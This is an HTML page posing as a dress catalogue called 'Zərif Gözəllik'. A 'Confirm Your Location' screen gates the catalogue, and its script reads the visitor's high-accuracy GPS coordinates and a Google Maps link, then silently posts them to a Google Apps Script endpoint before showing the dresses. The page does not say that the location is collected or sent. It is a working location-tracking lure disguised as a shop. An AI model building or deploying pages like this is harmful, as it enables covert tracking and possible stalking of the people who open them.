<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zərif Gözəllik</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  background:#f7f2f4;
  font-family:Arial,sans-serif;
  color:#222;
}
.logo{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  padding:18px 10px;
}
.page{
  max-width:600px;
  margin:auto;
}
.hero{
  position:relative;
  width:100%;
}
.hero img{
  width:100%;
  display:block;
}
.overlay{
  position:absolute;
  left:0;
  right:0;
  bottom:0;
  padding:25px 18px;
  text-align:center;
  background:rgba(0,0,0,.62);
  color:white;
}
.overlay h2{
  margin:0 0 8px;
  font-size:25px;
}
.overlay p{
  margin:0 0 18px;
  font-size:15px;
}
button{
  width:100%;
  padding:16px;
  border:0;
  border-radius:10px;
  background:#d6336c;
  color:white;
  font-size:17px;
  font-weight:bold;
}
.status{
  text-align:center;
  padding:20px;
  font-size:16px;
}
#catalog{
  display:none;
  padding:10px;
}
.dress{
  margin-bottom:22px;
  background:white;
  border-radius:12px;
  overflow:hidden;
}
.dress img{
  width:100%;
  display:block;
}
</style>
</head>

<body>

<div class="page">

<div class="logo">Zərif Gözəllik</div>

<div id="locationPage">

  <div class="hero">
    <img src="giris_lokesin_tesdiqi.jpg">

    <div class="overlay">
      <h2>Confirm Your Location</h2>
      <p>Allow location access to continue to the catalog.</p>
      <button onclick="getLocation()">Allow Location</button>
    </div>
  </div>

  <div id="status" class="status"></div>

</div>

<div id="catalog">

  <div class="dress">
    <img src="dress1.jpg">
  </div>

  <div class="dress">
    <img src="dress2.jpg">
  </div>

  <div class="dress">
    <img src="dress3.jpg">
  </div>

</div>

</div>

<script>

const SERVER_URL =
"https://script.google.com/macros/s/AKfycbzeqyh-gaDySv5fZN6ZWRHOPQDnmW71oeFi5xUtPbydUBixx_geJoNJyKlXeuZuQX43ag/exec";

function getLocation(){

  const status = document.getElementById("status");

  if(!navigator.geolocation){
    status.textContent = "Location is not supported by this browser.";
    return;
  }

  status.textContent = "Please allow location access...";

  navigator.geolocation.getCurrentPosition(

    function(position){

      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      const mapsUrl =
        "https://www.google.com/maps?q=" + lat + "," + lon;

      fetch(SERVER_URL,{
        method:"POST",
        mode:"no-cors",
        headers:{
          "Content-Type":"text/plain;charset=utf-8"
        },
        body:JSON.stringify({
          latitude:lat,
          longitude:lon,
          accuracy:accuracy,
          mapsUrl:mapsUrl
        })
      });

      document.getElementById("locationPage").style.display="none";
      document.getElementById("catalog").style.display="block";

    },

    function(){
      status.textContent =
        "Location permission was denied. Please allow location access to continue.";
    },

    {
      enableHighAccuracy:true,
      timeout:20000,
      maximumAge:0
    }

  );
}

</script>

</body>
</html>
